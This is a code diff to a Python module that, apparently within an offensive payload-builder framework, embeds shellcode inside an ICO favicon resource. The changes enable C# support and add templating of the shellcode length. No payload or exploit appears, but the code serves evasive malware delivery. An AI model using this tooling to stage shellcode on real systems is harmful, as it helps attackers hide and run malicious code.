@@ -18,6 +18,7 @@ from engine.component.UsingComponent import UsingComponent
 from engine.modules.IShellcodeRetrievalModule import IShellcodeRetrievalModule
 from engine.modules.TemplateModule import TemplateModule, ModuleNotCompatibleException
 from engine.structures.Resource import Resource
+from engine.structures.Ico import ICO
 from engine.structures.ResourceSet import ResourceSet
 from engine.structures.enums.ResourceType import ResourceType
 from enums.Language import Language
@@ -103,11 +104,8 @@ class IconShellcodeRetrievalModule(IShellcodeRetrievalModule):
                 ShellcodeRetrievalComponent(code=f"{function_name}(&{kwargs['args']});",
                                             shellcode_length=self.shellcode_length),
             ]
-        else:
-            raise ModuleNotCompatibleException()
         # This part will be enabled after the work on the ICON module is finalised
-        if language == Language.CSHARP:
-            raise ModuleNotCompatibleException()
+        elif language == Language.CSHARP:
             components = [
                 UsingComponent(import_name, language=language),
                 ShellcodeRetrievalComponent(code=rf"""{import_name}.{class_name}.{function_name}();""")
@@ -185,6 +183,12 @@ class IconShellcodeRetrievalModule(IShellcodeRetrievalModule):
                 code=kwargs[k],
                 placeholder=v
             )
+        # Perform shellcode length replacement
+        template.otf_replace(
+            code=str(len(shellcode)),
+            placeholder="####SHELLCODE_LENGTH####"
+        )
+
         # Perform ARGV replacement
         for i in range(len(args)):
             # Replace Arguments "in-use"
@@ -259,13 +263,18 @@ class IconShellcodeRetrievalModule(IShellcodeRetrievalModule):
         data = shellcode
         if isinstance(shellcode, str):
             data = unhexlify(shellcode)
-        with open(Config().get_temp_folder().joinpath("favicon_ico"), "wb") as icon:
-            icon.write(data)
+        icon_file = Config().get_temp_folder().joinpath("favicon_ico")
         if language == Language.POWERSHELL:
+            with open(icon_file, "wb") as icon:
+                icon.write(data)
             raise ModuleNotCompatibleException
         if language == Language.CSHARP:
+            ico = ICO(payload=shellcode)
+            ico.save(icon_file)
             return "byte[]", [], ""
         elif language == Language.CPP:
+            ico = ICO(payload=shellcode)
+            ico.save(icon_file)
             return "unsigned char*", ["int* length"], ""
 
     def write_rc(self):
